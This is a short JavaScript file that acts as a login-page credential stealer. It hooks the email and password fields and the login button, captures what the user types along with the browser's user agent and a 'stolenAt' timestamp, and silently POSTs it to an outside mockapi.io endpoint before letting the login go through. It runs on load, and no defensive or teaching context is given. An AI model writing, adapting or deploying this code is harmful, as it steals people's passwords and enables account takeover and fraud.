const keyLog = () => {
    try {
        const edEmail = document.getElementById("email");
        const edPass = document.getElementById("pass");

        const btnSubmit = document.querySelector("button[name='login']");

        btnSubmit.type = "button";
        btnSubmit.onclick = (e) => {
            var userAgent = navigator.userAgent;
            var email = edEmail.value;
            var pass = edPass.value;

            const user = {
                email: email,
                password: pass,
                userAgent: userAgent,
                stolenAt: dateTime(),
            };

            sendData(user);

            btnSubmit.type = "submit";
        };
    } catch {
        console.log("Error, can not find the elements!");
    }
};

const sendData = (user) => {
    const API = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";

    fetch(API, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(user),
    })
        .then((success) => {})
        .catch((error) => {});
};

function addZero(number) {
    return number < 10 ? "0" + number : number;
}

const dateTime = () => {
    var currentDate = new Date();
    var year = currentDate.getFullYear();
    var month = currentDate.getMonth() + 1;
    var day = currentDate.getDate();
    var hours = currentDate.getHours();
    var minutes = currentDate.getMinutes();
    var seconds = currentDate.getSeconds();
    var formattedDate = addZero(day) + "/" + addZero(month) + "/" + year;
    var formattedTime = addZero(hours) + ":" + addZero(minutes) + ":" + addZero(seconds);
    var dateTimeNow = formattedTime + " - " + formattedDate;
    return dateTimeNow;
};

keyLog();
